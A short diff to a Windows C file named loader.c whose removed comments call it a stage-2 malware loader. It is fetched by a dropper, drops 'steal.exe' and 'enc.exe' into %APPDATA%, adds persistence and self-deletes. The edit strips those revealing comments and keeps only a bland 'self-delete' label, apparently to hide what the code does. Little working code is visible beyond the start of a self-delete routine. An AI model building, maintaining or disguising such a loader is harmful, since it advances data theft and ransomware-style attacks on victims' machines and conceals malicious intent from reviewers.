@@ -1,6 +1,4 @@
-// loader.c — stage 2
-// Runs after dropper fetches it. Drops steal.exe + enc.exe to %APPDATA%,
-// adds persistence, then self-deletes.
+// self-delete
 
 #include <windows.h>
 #include <shlobj.h>
@@ -58,7 +56,7 @@ void run(const char* path) {
     }
 }
 
-// Self-delete — spawn cmd to delete this exe after we exit
+// Self-delete — spawn cmd to delete this exe 
 void self_delete() {
     char self[MAX_PATH];
     GetModuleFileNameA(NULL, self, MAX_PATH);
